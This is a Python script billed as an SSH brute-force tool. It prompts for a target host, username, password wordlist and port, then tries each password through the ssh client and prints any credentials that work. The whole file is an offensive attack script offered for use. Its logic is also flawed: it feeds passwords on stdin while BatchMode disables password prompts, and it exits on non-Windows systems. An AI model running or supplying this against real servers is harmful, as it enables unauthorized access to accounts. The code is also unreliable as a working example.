import subprocess
from termcolor import colored
from datetime import datetime
from os import path, name
import time


def print_header():
    print("\n" + colored("---------------------------------------------------------", "blue"))
    print(colored("[*] SSH Brute-force Tool", "cyan"))
    print(colored("---------------------------------------------------------", "blue") + "\n")


def get_user_input():
    """ Gather user input interactively """
    print(colored("[!] Please provide the following details:", "cyan"))
    target = input(colored("[*] Enter target IP/Hostname: ", "blue")).strip()
    username = input(colored("[*] Enter SSH Username: ", "blue")).strip()
    wordlist = input(colored("[*] Enter path to password wordlist: ", "blue")).strip()
    port = input(colored("[*] Enter SSH Port (default 22): ", "blue")).strip()

    if not port:
        port = 22  # Default port is 22
    else:
        port = int(port)

    # Validation
    if not path.exists(wordlist):
        print(colored("[-] Wordlist file not found. Please check the path.", "red"))
        exit(1)

    return target, username, wordlist, port


def ssh_bruteforce(hostname, username, password, port):
    """
    Tries to SSH using the provided credentials
    """
    try:
        # Use the built-in SSH command with timeout for brute-force
        command = [
            "ssh", f"{username}@{hostname}",
            "-p", str(port),
            "-o", "StrictHostKeyChecking=no",
            "-o", "BatchMode=yes",
            "-o", "ConnectTimeout=2",
            "echo success"
        ]

        result = subprocess.run(
            command,
            input=password.encode(),  # Send password through stdin
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Check the output for successful authentication
        if result.returncode == 0:
            print(colored(
                f"[+] Success: Host:{hostname} | Username:{username} | Password:{password}", "green"))
            return True

    except Exception as err:
        print(colored(f"[!] Error: {err}", "red"))

    return False


def main():
    """ Main function """
    print_header()

    # Get user input
    target, username, wordlist, port = get_user_input()

    print("\n" + colored("---------------------------------------------------------", "blue"))
    print(colored("[*] Brute-force Summary:", "cyan"))
    print(colored(f"[*] Target    : {target}", "cyan"))
    print(colored(f"[*] Username  : {username}", "cyan"))
    print(colored(f"[*] Port      : {port}", "cyan"))
    print(colored(f"[*] Wordlist  : {wordlist}", "cyan"))
    print(colored("[*] Protocol  : SSH", "cyan"))
    print(colored("---------------------------------------------------------", "blue") + "\n")

    print(colored(f"[!] Starting brute-force at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "yellow"))
    print(colored("---------------------------------------------------------", "blue"))

    # Start brute-force
    found = False

    with open(wordlist, 'r') as f:
        passwords = [line.strip() for line in f]

    for password in passwords:
        print(colored(
            f"[*] Attempting: {username}@{target} with password '{password}'", "cyan"))

        if ssh_bruteforce(target, username, password, port):
            found = True
            break

        time.sleep(0.5)  # Slight delay to avoid flooding

    if not found:
        print(colored("[-] Failed to find the correct password.", "red"))


if __name__ == "__main__":
    # Check if the OS is Windows
    if name != 'nt':
        print(colored("[-] This script is intended for Windows users only.", "red"))
        exit(1)

    main()
